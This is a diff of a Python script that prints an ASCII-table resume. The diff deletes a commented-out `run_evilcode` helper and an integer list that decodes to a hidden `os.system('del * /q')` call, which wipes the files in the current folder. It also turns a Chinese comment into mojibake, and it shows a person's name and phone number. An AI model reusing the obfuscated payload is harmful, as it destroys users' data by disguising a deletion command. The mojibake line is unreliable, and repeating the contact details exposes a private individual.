@@ -44,7 +44,7 @@
 ##\------/-----\-------------------------/------\------/
 
 
-#一个简单的字符表格框架，实现覆盖功能，效果如上，F5运行
+#涓�涓畝鍗曠殑瀛楃琛ㄦ牸妗嗘灦锛屽疄鐜拌鐩栧姛鑳斤紝鏁堟灉濡備笂锛孎5杩愯
 #--------------------------------
 import re,time,random,string
 #--------------------------------
@@ -117,7 +117,6 @@ def random_len(lens):
     strs = ''
     for i in range(lens):strs+=random.choice(string.printable[:-6])
     return strs
-#def run_evilcode(evilcode):exec(str(map(lambda i:hex(i) evilcode))[1:-1].replace('0x','\\x').replace(' ','').replace('\'','').replace(',','').decode("string_escape"))
 #--------------------------------
 label = ['name:','age:','gender:','from:','phone:']
 info = ['zhoulin','24','male','guiyang','18685446225']
@@ -131,7 +130,6 @@ cp = ['Shaoxing','University','(zhejiang)','Machinery']
 hw = ['','Literature','Poetry','Computer(now)','vilame']
 ce = ['','          Self-','study computer','for almost','a year']
 ew = ['','[0],Copy editor','[1],Video review','[2],The Writer','[3],Seller']
-#evilcode = [95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 111, 115, 39, 41, 46, 115, 121, 115, 116, 101, 109, 40, 39, 100, 101, 108, 32, 42, 32, 47, 113, 39, 41]
 #--------------------------------
 if __name__ == "__main__":
     for i in resume[:-1]:
